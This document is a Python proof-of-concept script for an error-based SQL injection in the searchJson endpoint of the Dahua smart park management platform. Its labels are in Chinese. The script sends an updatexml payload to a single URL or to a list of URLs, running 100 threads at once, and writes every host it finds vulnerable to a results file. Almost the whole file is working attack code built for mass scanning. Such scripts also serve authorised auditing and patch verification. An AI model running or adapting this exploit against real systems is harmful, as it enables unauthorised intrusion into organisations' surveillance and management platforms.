import requests,sys,argparse,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________  __
___  __ \__  / / /
__  / / /_  /_/ / 
_  /_/ /_  __  /  
/_____/ /_/ /_/   
                  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台 searchJson SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)',
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'close',
    }
    try:
        res1 = requests.get(url=target+payload1,headers=headers,verify=False)
        match = re.findall(r"<faultstring>(.*?)</faultstring>",res1.text)
        if res1.status_code == 500 and 'c4ca4238a0b923820dcc509a6f75849' in match[0]:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]不存在漏洞：{target}')
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')

if __name__ == '__main__':
    main()